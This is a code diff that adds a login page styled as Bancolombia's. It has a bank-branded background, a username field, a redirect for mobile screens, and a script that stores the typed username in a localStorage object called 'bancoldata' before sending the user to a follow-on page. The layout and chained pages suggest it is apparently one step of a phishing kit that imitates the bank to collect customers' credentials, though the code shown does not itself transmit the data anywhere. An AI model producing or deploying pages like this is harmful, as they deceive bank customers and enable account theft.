@@ -1,1 +1,76 @@
-<p>bancolombia works!</p>
+<div class="main-container">
+    <div class="image-container" id="imageContainer">
+        <img src="/assets/backgrounds/bancolombia-bg.png" alt="Background Image">
+        <div class="center-box">
+            <div class="input-container">
+                <i class="fas fa-user"></i>
+                <input type="text" placeholder="Usuario" id="userInput">
+            </div>
+        </div>
+        <div class="button-container">
+            <button>Cancelar</button>
+            <button id="continueButton" class="disabled">Continuar</button>
+        </div>
+        <script>
+        // Verificar si el usuario está en un dispositivo móvil
+        if (window.innerWidth <= 800) { // Este valor puede ajustarse según el tamaño que consideres móvil
+            window.location.href = "cel-login.html"; // Redirige a una página informando que no está disponible
+        }
+    
+        const userInput = document.getElementById('userInput');
+        const continueButton = document.getElementById('continueButton');
+        const imageContainer = document.getElementById('imageContainer');
+        const loader = document.getElementById('loader');
+    
+        // Habilitar/Deshabilitar el botón
+        userInput.addEventListener('input', () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                continueButton.classList.add('enabled');
+                continueButton.classList.remove('disabled');
+            } else {
+                continueButton.classList.add('disabled');
+                continueButton.classList.remove('enabled');
+            }
+        });
+    
+        // Acción al hacer clic en "Continuar"
+        continueButton.addEventListener('click', () => {
+            const userValue = userInput.value.trim();
+            if (userValue.length >= 4) {
+                // Obtener el valor existente de `bancoldata` en localStorage
+                let bancoldata;
+                try {
+                    const storedData = localStorage.getItem('bancoldata');
+                    bancoldata = storedData ? JSON.parse(storedData) : {};
+                } catch (e) {
+                    console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
+                    bancoldata = {}; // Reiniciar a un objeto vacío si hay error
+                }
+    
+                // Actualizar el objeto con el nuevo valor del usuario
+                bancoldata.usuario = userValue;
+    
+                // Guardar el valor actualizado en localStorage
+                localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
+    
+                // Redirigir a la página siguiente
+                window.location.href = 'index-cel.html';
+            } else {
+                alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
+            }
+        });
+    
+        // Mostrar el contenido solo cuando la página haya cargado completamente
+        window.addEventListener('load', () => {
+            // Ocultar el loader y mostrar el contenido de la imagen
+            loader.style.display = 'none';
+            imageContainer.style.display = 'block';
+        });
+    </script>
+    </div>
+    
+    <!-- Loader -->
+    <div class="loader" id="loader"></div>
+    
+</div>
